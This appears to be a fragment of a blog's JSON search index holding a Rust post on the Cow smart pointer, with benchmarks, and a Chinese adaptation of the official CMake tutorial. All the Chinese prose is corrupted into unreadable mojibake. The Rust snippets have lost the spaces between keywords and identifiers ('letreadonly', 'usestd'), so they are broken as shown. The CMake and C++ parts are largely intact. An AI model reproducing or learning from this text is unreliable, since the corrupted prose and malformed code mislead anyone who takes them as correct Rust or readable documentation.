Cowåä¸ºclone-on-writeï¼Œä½†æ˜¯å¯¹æ•°æ®ç±»å‹Bçš„traitè¦æ±‚æ˜¯ToOwnedï¼Œè€Œä¸æ˜¯Cloneã€‚è¿™æ˜¯å› ä¸ºCloneåªèƒ½ä»\u0026Tç”ŸæˆTï¼Œä½†æ˜¯ToOwnedæ³›åŒ–ä¸ºä»ä»»æ„ç»™å®šç±»å‹çš„å€Ÿç”¨æ•°æ®æ„å»ºæ–°ç±»å‹çš„æ•°æ®ã€‚åŠŸèƒ½æ›´ä¸ºå¼ºå¤§ã€‚ å¦‚ä¸‹ä¸€æ®µç¤ºä¾‹ä»£ç ï¼Œå°†Cowåº”ç”¨åœ¨ç»“æ„ä½“ä¸­ã€‚ usestd::borrow::Cow;struct Items\u003c'a,X: 'a\u003ewhere[X]: ToOwned\u003cOwned=Vec\u003cX\u003e\u003e,{values: Cow\u003c'a,[X]\u003e,}impl\u003c'a,X: Clone +'a\u003eItems\u003c'a,X\u003ewhere[X]: ToOwned\u003cOwned=Vec\u003cX\u003e\u003e,{fn new(v: Cow\u003c'a,[X]\u003e)-\u003e Self{Items{values: v}}}// Creates a container from borrowed values of a slice fn main(){letreadonly=[1,2];letborrowed=Items::new((\u0026readonly[..]).into());matchborrowed{Items{values: Cow::Borrowed(b),}=\u003eprintln!(\"borrowed {:?}\",b),_=\u003epanic!(\"expect borrowed value\"),}letmutclone_on_write=borrowed;// Mutates the data from slice into owned vec and pushes a new value on top clone_on_write.values.to_mut().push(3);println!(\"clone_on_write = {:?}\",clone_on_write.values);// The data was mutated. Let check it out. matchclone_on_write{Items{values: Cow::Owned(_),}=\u003eprintln!(\"clone_on_write contains owned data\"),_=\u003epanic!(\"expect owned data\"),}} è¿è¡Œç”Ÿæˆå¦‚ä¸‹ç»“æœï¼Œå¯è§å¯¹å€Ÿç”¨çš„æ•°æ®è¿›è¡Œä¿®æ”¹åï¼Œå‘ç”Ÿäº†å…‹éš†ã€‚ borrowed [1, 2] clone_on_write = [1, 2, 3] clone_on_write contains owned data ä½¿ç”¨ è¯•æƒ³è¿™æ ·ä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬éœ€è¦ç»™å¤„ç†ä¸€äº›Urlï¼Œå…¶ä¸­ä¸€éƒ¨åˆ†æ˜¯https://å¼€å¤´çš„ï¼Œè€Œå¦ä¸€éƒ¨åˆ†ä¸æ˜¯ï¼Œç°åœ¨è¦ç»™ç¼ºå°‘https://å‰ç¼€çš„UrlåŠ ä¸Šå‰ç¼€ã€‚ ä½¿ç”¨Cowï¼Œå‡½æ•°å¦‚ä¸‹ï¼š fn add_prefix_by_cow\u003c'a,T\u003e(urls: T,prefix: \u0026str)-\u003e Vec\u003cCow\u003c'a,String\u003e\u003ewhereT: IntoIterator\u003cItem=\u0026'aString\u003e,{urls.into_iter().map(|url|{ifurl.starts_with(prefix){Cow::Borrowed(url)}else{Cow::Owned(String::with_capacity(url.len()+prefix.len())+prefix+url)}}).collect()} ä¸ä½¿ç”¨Cowï¼Œå‡½æ•°å¦‚ä¸‹ï¼š fn add_prefix_by_clone\u003c'a,T\u003e(urls: T,prefix: \u0026'a str)-\u003e Vec\u003cString\u003ewhereT: IntoIterator\u003cItem=\u0026'aString\u003e,{urls.into_iter().map(|url|{ifurl.starts_with(prefix){url.clone()}else{url.clone()+prefix}}).collect()} ç”¨Criterionæ¥è¿›è¡Œ benchmark æµ‹è¯• fn bench(c: \u0026mutCriterion){letmutgroup=c.benchmark_group(\"cow_bench\");group.sampling_mode(SamplingMode::Linear);group.bench_function(\"cow\",|b|{b.iter_batched(||{letpre=vec![\"https://127.0.0.1\".to_string();1024];letnon_pre=vec![\"127.0.0.1\".to_string();1024];[pre,non_pre].concat()},|v|{let_=add_prefix_by_cow(\u0026v,\"https://\");},BatchSize::SmallInput,)});group.bench_function(\"clone\",|b|{b.iter_batched(||{letpre=vec![\"https://127.0.0.1\".to_string();1024];letnon_pre=vec![\"127.0.0.1\".to_string();1024];[pre,non_pre].concat()},|v|{let_=add_prefix_by_clone(\u0026v,\"https://\");},BatchSize::SmallInput,)});group.finish();} è¾“å‡ºå¦‚ä¸‹ï¼š cow_bench/cow time: [256.10 us 259.48 us 262.41 us] cow_bench/clone time: [448.13 us 457.38 us 467.73 us] ç”Ÿæˆåˆ†æå›¾ç‰‡å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå¯è§Cowåœ¨å¤§é‡çš„å†…å­˜æ“ä½œæ—¶ï¼Œèƒ½å°½å¯èƒ½çš„è¿›è¡Œå†…å­˜å…±äº«ï¼Œå»¶è¿Ÿè€—æ—¶çš„å…‹éš†æ“ä½œï¼Œè¿›è¡Œæ›´åŠ ç»†è‡´çš„å†…å­˜æ“ä½œæ§åˆ¶ã€‚ ","date":"2021-01-30","objectID":"/posts/rust-smartpointer-cow/:0:0","tags":["rust","æ™ºèƒ½æŒ‡é’ˆ","cow"],"title":"Rustæ™ºèƒ½æŒ‡é’ˆCow","uri":"/posts/rust-smartpointer-cow/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æœ€è¿‘å› ä¸ºæ¯•è®¾çš„åŸå› ï¼Œéœ€è¦çœ‹ Cpp é¡¹ç›®ï¼Œé¦–å…ˆé¡¹ç›®æ„å»ºå°±æ¶‰åŠåˆ°äº† CMakeï¼Œæ‰€ä»¥è·Ÿç€ CMake å®˜ç½‘çš„ Tutorial å­¦ä¹ äº†ä¸€ä¸‹ï¼Œè¯¥æ–‡ç« ç®—æ˜¯å®˜ç½‘æ•™ç¨‹çš„æ¬è¿ã€‚ Tutorial ç‚¹è¿™é‡Œ, GitHub ä»£ç ç‚¹è¿™é‡Œ. æ„å»ºç®€å•é¡¹ç›® æœ€åŸºæœ¬çš„ CMake é¡¹ç›®æ˜¯ç”±æºä»£ç æ–‡ä»¶æ„å»ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚å¯¹äºç®€å•çš„é¡¹ç›®ï¼Œåªéœ€è¦ä¸€ä¸ªä¸‰è¡Œçš„ CMakeLists.txt æ–‡ä»¶ã€‚è¿™å°†æ˜¯æˆ‘ä»¬ tutorial çš„èµ·ç‚¹ã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:0:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"å¼€å§‹é¡¹ç›® cmake_minimum_required(VERSION 3.10)# set the project name project(Tutorial)# add the executable add_executable(Tutorial tutorial.cxx) æºä»£ç tutorial.cxxå¦‚ä¸‹ // A simple program that computes the square root of a number #include \u003ccmath\u003e#include \u003ccstdlib\u003e#include \u003ciostream\u003e#include \u003cstring\u003e int main(int argc, char* argv[]) { if (argc \u003c 2) { std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } // convert input to double const double inputValue = atof(argv[1]); // calculate square root const double outputValue = sqrt(inputValue); std::cout \u003c\u003c \"The square root of \" \u003c\u003c inputValue \u003c\u003c \" is \" \u003c\u003c outputValue \u003c\u003c std::endl; return 0; } ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ·»åŠ ç‰ˆæœ¬å·å¹¶é…ç½®å¤´æ–‡ä»¶ æ·»åŠ ç‰ˆæœ¬å· #set the project name and version project(Tutorial VERSION 1.0) ç„¶åï¼Œé…ç½®ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œå°†ç‰ˆæœ¬å·ä¼ é€’ç»™æºä»£ç  configure_file(TutorialConfig.h.in TutorialConfig.h) ç”±äºé…ç½®çš„æ–‡ä»¶å°†è¢«å†™å…¥äºŒå‰æ ‘ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»å°†è¯¥ç›®å½•æ·»åŠ åˆ°æœç´¢ include æ–‡ä»¶çš„è·¯å¾„åˆ—è¡¨ä¸­ï¼ˆè¯¥å£°æ˜æ”¾åœ¨add_executableä¹‹åï¼‰: target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) æ–°å»ºTutorialConfig.h.in // the configured options and settings for Tutorial #define Tutorial_VERSION_MAJOR @Tutorial_VERSION_MAJOR@ #define Tutorial_VERSION_MINOR @Tutorial_VERSION_MINOR@ å½“ CMake é…ç½®è¿™ä¸ªå¤´æ–‡ä»¶æ—¶ï¼Œ@Tutorial_VERSION_MAJOR@å’Œ@Tutorial_VERSION_MINOR@çš„å€¼å°†è¢«æ›¿æ¢ã€‚ æ¥ç€ï¼Œä¿®æ”¹æºä»£ç ï¼Œinclude å¤´æ–‡ä»¶TutorialConfig.hã€‚ç„¶åï¼Œæ›´æ–°æºä»£ç æ‰“å°å‡ºå¯æ‰§è¡Œæ–‡ä»¶çš„åç§°å’Œç‰ˆæœ¬å·ï¼š if (argc \u003c 2) { // report version std::cout \u003c\u003c argv[0] \u003c\u003c \" Version \" \u003c\u003c Tutorial_VERSION_MAJOR \u003c\u003c \".\" \u003c\u003c Tutorial_VERSION_MINOR \u003c\u003c std::endl; std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } æŒ‡å®šä½¿ç”¨ C++11 æ ‡å‡†ï¼Œä½¿ç”¨std::stod cmake_minimum_required(VERSION 3.10)# set the project name and version project(Tutorial VERSION 1.0)# specify the C++ standard set(CMAKE_CXX_STANDARD 11)set(CMAKE_CXX_STANDARD_REQUIRED True) CMAKE_CXX_STANDARD ç”Ÿå‘½å¿…é¡»æ”¾åœ¨ add_executable ä¹‹å‰ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:2:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æ„å»ºå¹¶æµ‹è¯• é¦–å…ˆæ„å»º mkdir step1_build cd step1_build cmake .. cmake --build . ç„¶åæµ‹è¯• Tutorial 4294967296 Tutorial 10 Tutorial æ·»åŠ ä¸€ä¸ªåº“ æˆ‘ä»¬å°†å‘é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªåº“ã€‚è¿™ä¸ªåº“å°†åŒ…å«äº†è‡ªå®šä¹‰çš„å¹³æ–¹æ ¹å‡½æ•°çš„å®ç°ã€‚ä¹‹åï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ä½¿ç”¨ç”¨è¿™ä¸ªåº“ï¼Œæ›¿æ¢ç¼–è¯‘å™¨æä¾›çš„æ ‡å‡†å¹³æ–¹æ ¹å‡½æ•°ã€‚ æ–°å»ºMathFunctionsç›®å½•ï¼Œåœ¨å…¶ä¸‹æ·»åŠ CMakeLists.txt,æ·»åŠ å¦‚ä¸‹å†…å®¹: add_library(MathFunctions mysqrt.cxx) mysqrt.cxxå¦‚ä¸‹ï¼š #include \u003ciostream\u003e // a hack square root calculation using simple operations double mysqrt(double x) { if (x \u003c= 0) { return 0; } double result = x; // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } ä¸ºäº†ä½¿ç”¨æ–°åº“ï¼Œæˆ‘ä»¬å°†åœ¨é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªadd subdirectory()è°ƒç”¨ï¼Œä»¥ä¾¿æ„å»ºåº“ã€‚æˆ‘ä»¬å°†æ–°åº“æ·»åŠ åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œå¹¶å°†MathFunctionsæ·»åŠ ä¸º include ç›®å½•ï¼Œä»¥ä¾¿å¯ä»¥æ‰¾åˆ°mqsqrt.hå¤´æ–‡ä»¶ã€‚é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶çš„æœ€åå‡ è¡Œç°åœ¨çœ‹èµ·æ¥åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š # add the MathFunctions library add_subdirectory(MathFunctions)# add the executable add_executable(Tutorial tutorial.cxx)target_link_libraries(Tutorial PUBLIC MathFunctions)# add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" \"${PROJECT_SOURCE_DIR}/MathFunctions\" ) ç°åœ¨è®©æˆ‘ä»¬æŠŠ MathFunctions åº“å˜æˆå¯é€‰çš„ã€‚è™½ç„¶å¯¹äºæœ¬æ•™ç¨‹æ¥è¯´ï¼Œæ²¡æœ‰å¿…è¦è¿™æ ·åšï¼Œä½†å¯¹äºå¤§å‹é¡¹ç›®æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§å¸¸è§çš„æƒ…å†µã€‚ç¬¬ä¸€æ­¥æ˜¯åœ¨é¡¶å±‚çš„ CMakeLists.txt æ–‡ä»¶ä¸­æ·»åŠ ä¸€ä¸ªé€‰é¡¹ï¼ˆoptionæ”¾åœ¨configure_fileå‰é¢ï¼‰: option(USE_MYMATH \"Use tutorial provided math implementation\" ON)# configure a header file to pass some of the CMake settings # to the source code configure_file(TutorialConfig.h.in TutorialConfig.h) è¿™ä¸ªé€‰é¡¹ä¼šåœ¨ cmake-gui å’Œ ccmake ä¸­æ˜¾ç¤ºï¼Œé»˜è®¤å€¼ä¸º ONï¼Œç”¨æˆ·å¯ä»¥æ›´æ”¹ã€‚è¿™ä¸ªè®¾ç½®å°†è¢«ä¿å­˜åœ¨ç¼“å­˜ä¸­ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¸éœ€è¦åœ¨æ¯æ¬¡è¿è¡Œ CMake çš„æ—¶å€™è®¾ç½®è¿™ä¸ªå€¼ã€‚ ä¸‹ä¸€ä¸ªæ­¥æ˜¯ä½¿æ„å»ºå’Œé“¾æ¥MathFunctionsåº“æˆä¸ºæ¡ä»¶åˆ¤æ–­çš„ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†é¡¶å±‚CMakeLists.txtæ–‡ä»¶çš„ç»“å°¾æ”¹ä¸ºå¦‚ä¸‹æ‰€ç¤º: if(USE_MYMATH) add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) list(APPEND EXTRA_INCLUDES \"${PROJECT_SOURCE_DIR}/MathFunctions\")endif()# add the executable add_executable(Tutorial tutorial.cxx)target_link_libraries(Tutorial PUBLIC ${EXTRA_LIBS})# add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ${EXTRA_INCLUDES} ) è¯·æ³¨æ„ä½¿ç”¨å˜é‡EXTRA_LIBSæ¥æ”¶é›†ä»»ä½•å¯é€‰çš„åº“ï¼Œä»¥ä¾¿ä»¥åé“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚å˜é‡EXTRA_INCLUDESä¹ŸåŒæ ·ç”¨äºå¤„ç†å¯é€‰çš„å¤´æ–‡ä»¶ã€‚è¿™æ˜¯åœ¨å¤„ç†è®¸å¤šå¯é€‰ç»„ä»¶æ—¶çš„ä¼ ç»Ÿæ–¹æ³•ï¼Œä¸‹ä¸€æ­¥è®²ä»‹ç»æ›´ä¸ºç°ä»£åŒ–æ–¹æ³•ã€‚ ç›¸åº”çš„ï¼Œéœ€è¦ç®€å•ä¿®æ”¹æºä»£ç ã€‚é¦–å…ˆï¼Œåœ¨tutorial.cxxä¸­ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„è¯ï¼Œå°±åŠ å…¥MathFunctions.hå¤´æ–‡ä»¶ï¼š #ifdef USE_MYMATH # include \"MathFunctions.h\" #endif ç„¶åï¼Œä½¿ç”¨USE_MYMATHæ§åˆ¶åº“å‡½æ•°çš„è°ƒç”¨ï¼š #ifdef USE_MYMATH const double outputValue = mysqrt(inputValue); #else const double outputValue = sqrt(inputValue); #endif ç”±äºæºä»£ç ç°åœ¨éœ€è¦ USE_MYMATHï¼Œ æˆ‘ä»¬å¯ä»¥åœ¨ TutorialConfig.h.inä¸­åŠ å…¥ä¸‹é¢è¿™è¡Œ: #cmakedefine USE_MYMATH æ¥ä¸‹æ¥ï¼Œåœ¨æ„å»ºæ—¶ï¼Œå¯ä»¥ä½¿ç”¨-Dæ·»åŠ ä½¿ç”¨é€‰é¡¹ï¼Œä¾‹å¦‚è¦å…³é—­é€‰é¡¹ï¼Œä½¿ç”¨ï¼š cmake .. -DUSE_MYMATH=OFF æ·»åŠ åº“çš„ä½¿ç”¨æ¡ä»¶ ä½¿ç”¨æ¡ä»¶å…è®¸æ›´å¥½åœ°æ§åˆ¶åº“æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„é“¾æ¥å’Œincludeè¡Œï¼ŒåŒæ—¶ä¹Ÿç»™äºˆ CMake å†…éƒ¨ target çš„è½¬ä¹‰å±æ€§æ›´å¤šçš„æ§åˆ¶ã€‚åˆ©ç”¨ä½¿ç”¨æ¡ä»¶çš„ä¸»è¦å‘½ä»¤æœ‰: target_compile_definitions() target_compile_options() target_include_directories() target_link_libraries() è®©æˆ‘ä»¬ä»æ­¥éª¤ 2 å¼€å§‹ä¸­é‡æ„æˆ‘ä»¬çš„ä»£ç ï¼Œä½¿ç”¨ç°ä»£ CMake çš„ä½¿ç”¨æ¡ä»¶æ–¹æ³•ã€‚æˆ‘ä»¬é¦–å…ˆå£°æ˜ï¼Œä»»ä½•äººé“¾æ¥åˆ°MathFunctionséƒ½éœ€è¦åŒ…å«å½“å‰ç›®å½•ï¼Œè€ŒMathFunctionsæœ¬èº«ä¸éœ€è¦ã€‚æ‰€ä»¥è¿™å¯ä»¥æˆä¸ºä¸€ä¸ªINTERFACEçš„ä½¿ç”¨æ¡ä»¶ã€‚ è®°ä½ï¼ŒINTERFACEæ˜¯æŒ‡ä½¿ç”¨è€…éœ€è¦è€Œæä¾›è€…ä¸éœ€è¦çš„ä¸œè¥¿ã€‚åœ¨MathFunctions/CMakeLists.txtçš„æœ«å°¾æ·»åŠ ä»¥ä¸‹å‡ è¡Œ: target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) ç°åœ¨æˆ‘ä»¬å·²ç»æŒ‡å®šäº† MathFunctionsçš„ä½¿ç”¨æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å®‰å…¨åœ°ä»é¡¶å±‚çš„ CMakeLists.txtä¸­åˆ é™¤å¯¹ EXTRA_INCLUDES å˜é‡çš„ä½¿ç”¨ã€‚ æ­¤å¤„ if(USE_MYMATH) # add the MathFunctions library add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions)endif() å’Œæ­¤å¤„ target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) ä¹‹åä¾¿å¯ä»¥é‡æ–°æ„å»ºé¡¹ç›®äº†ã€‚ å®‰è£…å’Œæµ‹è¯• ç°åœ¨æˆ‘ä»¬å¯ä»¥å¼€å§‹ä¸ºæˆ‘ä»¬çš„é¡¹ç›®æ·»åŠ å®‰è£…è§„åˆ™å’Œæµ‹è¯•æ”¯æŒã€‚ ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:3:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"å®‰è£…è§„åˆ™ å®‰è£…è§„åˆ™ç›¸å½“ç®€å•ï¼šå¯¹äºMathFunctionsï¼Œæˆ‘ä»¬è¦å®‰è£…åº“å’Œå¤´æ–‡ä»¶ï¼Œå¯¹äºåº”ç”¨ç¨‹åºï¼Œæˆ‘ä»¬è¦å®‰è£…å¯æ‰§è¡Œæ–‡ä»¶å’Œé…ç½®çš„å¤´æ–‡ä»¶ã€‚ æ‰€ä»¥åœ¨MathFunctions/CMakeLists.txtä¸­æ·»åŠ ï¼š install(TARGETS MathFunctions DESTINATION lib)install(FILES MathFunctions.h DESTINATION include) åœ¨é¡¶å±‚çš„CMakeLists.txtä¸­ æ·»åŠ ï¼š install(TARGETS Tutorial DESTINATION bin)install(FILES \"${PROJECT_BINARY_DIR}/TutorialConfig.h\" DESTINATION include ) è¿™å°±æ˜¯ä¸ºtutorialåˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„æœ¬åœ°å®‰è£…æ‰€éœ€è¦çš„å…¨éƒ¨å†…å®¹ã€‚ ç°åœ¨é‡æ–°æ¥é…ç½®é¡¹ç›®å¹¶æ„å»ºå®ƒã€‚ç„¶ååœ¨å‘½ä»¤è¡Œä½¿ç”¨cmake å‘½ä»¤çš„install é€‰é¡¹æ¥è¿è¡Œå®‰è£…æ­¥éª¤ (åœ¨ 3.15 ä¸­å¼•å…¥ï¼Œæ—§ç‰ˆæœ¬çš„ CMake å¿…é¡»ä½¿ç”¨ make install)ã€‚å¯¹äºå¤šé…ç½®å·¥å…·ï¼Œä¸è¦å¿˜è®°ä½¿ç”¨â€“config å‚æ•°æ¥æŒ‡å®šé…ç½®ã€‚å¦‚æœä½¿ç”¨ IDEï¼Œåªéœ€æ„å»ºINSTALL targetã€‚è¿™ä¸€æ­¥å°†å®‰è£…ç›¸åº”çš„å¤´æ–‡ä»¶ã€åº“å’Œå¯æ‰§è¡Œæ–‡ä»¶ã€‚ä¾‹å¦‚: cmake --install . CMake å˜é‡ CMAKE_INSTALL_PREFIX ç”¨äºç¡®å®šæ–‡ä»¶å®‰è£…çš„æ ¹ç›®å½•ã€‚å¦‚æœä½¿ç”¨ cmake --install å‘½ä»¤ï¼Œå®‰è£…ç›®å½•å¯ä»¥é€šè¿‡ --prefixå‚æ•°é‡å†™ã€‚ä¾‹å¦‚ï¼š cmake --install . --prefix \"/home/myuser/installdir\" ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æµ‹è¯•æ”¯æŒ æ¥ä¸‹æ¥ï¼Œæµ‹è¯•æˆ‘ä»¬çš„åº”ç”¨ç¨‹åºã€‚åœ¨é¡¶å±‚çš„CMakeLists.txtæ–‡ä»¶çš„æœ«å°¾ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨æµ‹è¯•ï¼Œç„¶åæ·»åŠ ä¸€äº›åŸºæœ¬æµ‹è¯•ä»¥éªŒè¯åº”ç”¨ç¨‹åºæ˜¯å¦æ­£å¸¸è¿è¡Œã€‚ enable_testing()# does the application run add_test(NAME Runs COMMAND Tutorial 25)# does the usage message work? add_test(NAME Usage COMMAND Tutorial)set_tests_properties(Usage PROPERTIES PASS_REGULAR_EXPRESSION \"Usage:.*number\" )# define a function to simplify adding tests function(do_test target arg result) add_test(NAME Comp${arg} COMMAND ${target} ${arg}) set_tests_properties(Comp${arg} PROPERTIES PASS_REGULAR_EXPRESSION ${result} )endfunction(do_test)# do a bunch of result based tests do_test(Tutorial 4 \"4 is 2\")do_test(Tutorial 9 \"9 is 3\")do_test(Tutorial 5 \"5 is 2.236\")do_test(Tutorial 7 \"7 is 2.645\")do_test(Tutorial 25 \"25 is 5\")do_test(Tutorial -25 \"-25 is [-nan|nan|0]\")do_test(Tutorial 0.0001 \"0.0001 is 0.01\") ç¬¬ä¸€ä¸ªæµ‹è¯•åªæ˜¯ç®€å•åœ°éªŒè¯åº”ç”¨ç¨‹åºæ˜¯å¦è¿è¡Œï¼Œæ²¡æœ‰ segfault æˆ–å…¶ä»–å´©æºƒï¼Œå¹¶ä¸”è¿”å›å€¼ä¸ºé›¶ã€‚è¿™æ˜¯ CTest æµ‹è¯•çš„åŸºæœ¬å½¢å¼ã€‚ ä¸‹ä¸€ä¸ªæµ‹è¯•åˆ©ç”¨PASS_REGULAR_EXPRESSIONæµ‹è¯•å±æ€§æ¥éªŒè¯æµ‹è¯•çš„è¾“å‡ºæ˜¯å¦åŒ…å«æŸäº›å­—ç¬¦ä¸²ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒéªŒè¯å½“æä¾›çš„å‚æ•°æ•°é‡ä¸æ­£ç¡®æ—¶ï¼Œæ˜¯å¦ä¼šæ‰“å°å‡ºä½¿ç”¨ä¿¡æ¯ã€‚ æœ€åï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º do_test çš„å‡½æ•°ï¼Œå®ƒè¿è¡Œåº”ç”¨ç¨‹åºå¹¶éªŒè¯ç»™å®šè¾“å…¥çš„è®¡ç®—å¹³æ–¹æ ¹æ˜¯å¦æ­£ç¡®ã€‚æ¯è°ƒç”¨ä¸€æ¬¡do_testï¼Œå°±ä¼šåœ¨é¡¹ç›®ä¸­æ·»åŠ ä¸€ä¸ªæµ‹è¯•ï¼ŒåŒ…æ‹¬åç§°ã€è¾“å…¥å’ŒåŸºäºä¼ é€’çš„å‚æ•°çš„é¢„æœŸç»“æœã€‚ é‡æ–°æ„å»ºåº”ç”¨ç¨‹åºï¼Œç„¶å cd åˆ°äºŒè¿›åˆ¶ç›®å½•ï¼Œè¿è¡Œctestå¯æ‰§è¡Œæ–‡ä»¶ï¼šctest -Nï¼ˆ--show-only[=format]ï¼‰å’Œctest -VVï¼ˆ--extra-verboseï¼‰ã€‚å¯¹äºå¤šé…ç½®ç”Ÿæˆå™¨ï¼ˆå¦‚ Visual Studioï¼‰ï¼Œå¿…é¡»æŒ‡å®šé…ç½®ç±»å‹ã€‚ä¾‹å¦‚ï¼Œè¦åœ¨ Debug æ¨¡å¼ä¸‹è¿è¡Œæµ‹è¯•ï¼Œä»æ„å»ºç›®å½•ä¸­ä½¿ç”¨ctest -C Debug -VVï¼ˆä¸æ˜¯ Debug å­ç›®å½•ï¼ï¼‰ã€‚æˆ–è€…ï¼Œä» IDE ä¸­æ„å»ºRUN_TESTSç›®æ ‡ã€‚ æ·»åŠ ç³»ç»Ÿè‡ªæ£€ è®©æˆ‘ä»¬è€ƒè™‘åœ¨æˆ‘ä»¬çš„é¡¹ç›®ä¸­æ·»åŠ ä¸€äº›ä»£ç ï¼Œè¿™äº›ä»£ç å–å†³äºç›®æ ‡å¹³å°å¯èƒ½æ²¡æœ‰çš„åŠŸèƒ½ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†æ·»åŠ ä¸€äº›ä»£ç ï¼Œè¿™äº›ä»£ç å–å†³äºç›®æ ‡å¹³å°æ˜¯å¦æœ‰ log å’Œ exp å‡½æ•°ã€‚å½“ç„¶ï¼Œå‡ ä¹æ¯ä¸ªå¹³å°éƒ½æœ‰è¿™äº›å‡½æ•°ï¼Œä½†åœ¨æœ¬æ•™ç¨‹ä¸­ï¼Œå‡è®¾å®ƒä»¬å¹¶ä¸å¸¸è§ã€‚ å¦‚æœå¹³å°ä¸Šæœ‰ log å’Œ expï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä½¿ç”¨å®ƒä»¬æ¥è®¡ç®— mysqrt å‡½æ•°ä¸­çš„å¹³æ–¹æ ¹ã€‚æˆ‘ä»¬é¦–å…ˆä½¿ç”¨é¡¶å±‚CMakeLists.txtä¸­çš„CheckSymbolExistsæ¨¡å—æµ‹è¯•è¿™äº›å‡½æ•°æ˜¯å¦å¯ç”¨ã€‚åœ¨æŸäº›å¹³å°ä¸Šï¼Œæˆ‘ä»¬éœ€è¦é“¾æ¥åˆ°måº“ã€‚å¦‚æœæœ€åˆæ²¡æœ‰æ‰¾åˆ°logå’Œexpï¼Œåˆ™éœ€è¦ä½¿ç”¨måº“å¹¶å†æ¬¡å°è¯•ã€‚ æˆ‘ä»¬å°†ä½¿ç”¨TutorialConfig.h.inä¸­çš„æ–°å®šä¹‰ï¼Œæ‰€ä»¥ä¸€å®šè¦åœ¨é…ç½®è¯¥æ–‡ä»¶ä¹‹å‰è®¾ç½®å®ƒä»¬ã€‚ å¦‚æœç³»ç»Ÿä¸Šæœ‰logå’Œexpï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†åœ¨mysqrtå‡½æ•°ä¸­ä½¿ç”¨å®ƒä»¬æ¥è®¡ç®—å¹³æ–¹æ ¹ã€‚åœ¨MathFunctions/mysqrt.cxxä¸­çš„mysqrtå‡½æ•°ä¸­æ·»åŠ ä»¥ä¸‹ä»£ç ï¼ˆåœ¨è¿”å›ç»“æœä¹‹å‰ä¸è¦å¿˜è®°#endifï¼ï¼‰ã€‚ é‡æ–°æ„å»ºé¡¹ç›®ï¼Œä¼šå‘ç°æ— è®ºå¹³å°ä¸Šæ˜¯å¦æœ‰logå’Œexpï¼Œéƒ½ä¸ä¼šè°ƒç”¨å®ƒä»¬ã€‚å› ä¸ºæˆ‘ä»¬å¿˜è®°äº†åœ¨mysqrt.cxxä¸­ include TutorialConfig.hã€‚ç°åœ¨æ›´æ–° æˆ‘ä»¬è¿˜éœ€è¦æ›´æ–°MathFunctions / CMakeLists.txtï¼Œä»¥ä¾¿mysqrt.cxxçŸ¥é“æ­¤æ–‡ä»¶çš„ä½ç½®ï¼š target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_BINARY_DIR} ) ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:5:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["æ„å»ºå·¥å…·"],"content":"æŒ‡å®šç¼–è¯‘å®šä¹‰ 